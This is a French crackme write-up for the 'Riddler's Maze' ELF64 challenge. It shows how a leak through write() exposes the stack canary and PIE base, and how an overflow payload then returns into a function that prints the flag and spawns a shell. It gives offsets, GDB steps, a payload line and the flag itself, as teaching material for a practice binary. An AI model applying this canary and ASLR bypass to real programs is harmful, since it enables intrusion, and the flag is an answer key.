# 23x41's 0x8A7 — Riddler's Maze

> **Origine** : [`ORIGIN.yml`](ORIGIN.yml) · [crackmes.one](https://crackmes.one/crackme/6a597d7f0691b3daf2a3f2a0) · id `6a597d7f0691b3daf2a3f2a0`

Crackme **ELF64 x86-64 PIE**, C, non strippé (+ debug_info). Overflow avec **canary + PIE/ASLR** : leak via `write`, puis ret2 `open_batcave`.
Auteur : [23x41](https://crackmes.one/user/23x41).

Dossier : `authors/23x41/6a597d7f0691b3daf2a3f2a0/` — [famille](../README.md) · [repo](../../../README.md).

| Fichier | Rôle |
|---|---|
| [`riddler_maze`](original/riddler_maze) | binaire d’origine |
| [`README.md`](README.md) | ce write-up |
| [`riddler-maze-solve.py`](tools/riddler-maze-solve.py) | leak canary/PIE + ret2open |

## Réponse

| | |
|---|---|
| **Flag** | `FLAG{0x8A7_P1E_L34K_4SLR_BYP4SS}` |
| Mot de passe (leurre) | `Wh4t_Am_1` — `strncmp` OK **sans** appeler `open_batcave` |

```bash
python3 tools/riddler-maze-solve.py -q
python3 tools/riddler-maze-solve.py --check
```

---

## 1. Premier regard

```text
file original/riddler_maze
# ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

sha256: 2ff4a9c69fd2cb5ee7ea295c389f64f6e4e29c42369344a7d67003f09efd5afa
```

| Protection | État |
|---|---|
| PIE | oui (`ET_DYN`) |
| Canary | oui (`__stack_chk_fail`) |
| NX | oui (typique) |
| Full RELRO | n/a pour l’exo (ret2text) |

| Symbole | Offset |
|---|---|
| `open_batcave` | `0x11b9` |
| `riddle_leak` | `0x1232` |
| `check_password` | `0x12df` |
| `main` | `0x13a7` |

Flag en clair dans `.rodata` — le but pédagogique est le **bypass canary + PIE**, pas `strings`.

---

## 2. Flow

```text
main
  banner Wayne Enterprises
  riddle_leak()
  check_password()
  "[LOG] Session ended."

riddle_leak
  printf("what's your name? ")
  read(0, buf, 0x20)          ; buf @ rbp-0x30
  printf("A pleasure, '")
  write(1, buf, 0x40)         ; leak 64 octets → canary + rbp + ret
  puts("'.")

check_password
  printf("Enter the Maze access code: ")
  read(0, buf, 0x2bc)         ; buf @ rbp-0x50 — overflow énorme
  strncmp(buf, "Wh4t_Am_1", 9)
    OK  → "Correct code -- but a riddle needs..."
    KO  → "Wrong! The maze walls close in..."
  ; jamais open_batcave

open_batcave
  BATCOMPUTER / victory
  puts(FLAG)
  system("/bin/sh")
```

---

## 3. Leak & overflow

### Leak (`riddle_leak`)

Frame `0x40`, buffer `@ rbp-0x30`, canary `@ rbp-0x8`.

`write(1, buf, 0x40)` depuis le buffer :

| Offset | Contenu |
|---|---|
| `0x00` … | name (32 octets lus) + padding |
| `0x28` | **canary** |
| `0x30` | saved `rbp` |
| `0x38` | **return address** (`main+0x141d`) |

```text
PIE base = leaked_ret - 0x141d
open_batcave = PIE + 0x11b9
```

### Overflow (`check_password`)

| Offset depuis buf | Contenu |
|---|---|
| `0x48` | canary (à reproduire) |
| `0x50` | saved rbp |
| `0x58` | return → `open_batcave` |

```python
payload = b"B"*0x48 + p64(canary) + p64(0) + p64(pie + 0x11b9)
# stdin : 32×'A'  puis  payload   (même processus)
```

---

## Debug GDB (pas à pas)

ELF **PIE** + **canary**, non strippé (+ `debug_info`). Sous GDB les adresses sont du type `0x55555555….` ; les offsets du write-up restent valides.

### 4.1 Cartographie

```bash
gdb -q ./original/riddler_maze
(gdb) info address open_batcave     # offset fichier 0x11b9
(gdb) info address riddle_leak
(gdb) info address check_password
(gdb) disassemble riddle_leak
```

Dans `riddle_leak` :

| Offset fn | Instruction | Rôle |
|---|---|---|
| `+8` | `mov rax, fs:0x28` | charge le **canary** → `[rbp-0x8]` |
| `+75` | `call read@plt` | `read(0, rbp-0x30, 0x20)` |
| `+128` | `call write@plt` | `write(1, rbp-0x30, 0x40)` ← **leak** |

### 4.2 Montrer que le mot de passe ne mène pas au flag

```text
(gdb) break open_batcave
(gdb) run
# name : 32× A
# code : Wh4t_Am_1
# → open_batcave N'EST PAS atteint ; message « Correct code -- but a riddle… »
```

### 4.3 Lire canary + PIE en live (même session)

```text
(gdb) break *riddle_leak+128     # juste avant write (ajuste si ASLR d’offset)
# plus simple avec source line si dispo :
(gdb) break riddle_leak
(gdb) run
(gdb) # avancer jusqu’après le read (next / break *…+80)
(gdb) finish                     # ou break sur write@plt puis finish
```

Après le `read` de 32 octets, **avant** le `write` :

```text
(gdb) x/8gx $rbp-0x30
# [0].. name
# [rbp-0x8] = canary (octet bas souvent 0x00)
(gdb) print/x *(unsigned long*)($rbp-0x8)     # canary
(gdb) print/x *(unsigned long*)($rbp+0x8)     # saved rip → main+…
(gdb) print/x $rip & ~0xfff                   # approx base PIE (ou info proc map)
```

Formule du write-up :

```text
PIE base     = leaked_ret - 0x141d
open_batcave = PIE + 0x11b9
```

Sous GDB tu peux aussi :

```text
(gdb) print open_batcave          # adresse runtime absolue
```

### 4.4 Overflow dans `check_password`

```text
(gdb) break check_password
(gdb) continue
(gdb) # après le read massif (0x2bc), avant leave/ret :
(gdb) x/gx $rbp-0x8               # canary encore intact ?
```

Payload (même idée que le solveur) : `0x48` padding + canary leaké + fake rbp + `open_batcave`.

```text
(gdb) break open_batcave
(gdb) # relancer tout le flow avec le solveur, ou coller le payload à la 2e invite
(gdb) continue
# hit → puts(FLAG)
```

Astuce pratique : garder **une seule** session processus (leak puis overflow), comme `riddler-maze-solve.py --check`. Sous GDB, `run` d’un seul tenant avec un script d’input, ou `python3 tools/riddler-maze-solve.py --check` pour la preuve et GDB pour comprendre le leak.

### 4.5 Canary fail volontaire

Si tu écrases le canary avec des `B` :

```text
(gdb) # → __stack_chk_fail / abort
```

---

## 4. Vérification

```bash
python3 tools/riddler-maze-solve.py --check
# [BATCOMPUTER]: Access Granted...
# FLAG{0x8A7_P1E_L34K_4SLR_BYP4SS}
# OK
```

Live natif x86-64 (ce serveur) : OK.

---

## 5. Notes

- `Wh4t_Am_1` est un **red herring** : même correct, pas de flag.
- Canary et PIE changent à chaque run → leak et overflow **dans la même session**.
- Cheese `strings` possible ; hors sujet par rapport à l’énoncé (bypass ASLR/PIE/canary).
- Pas de username `petik`.
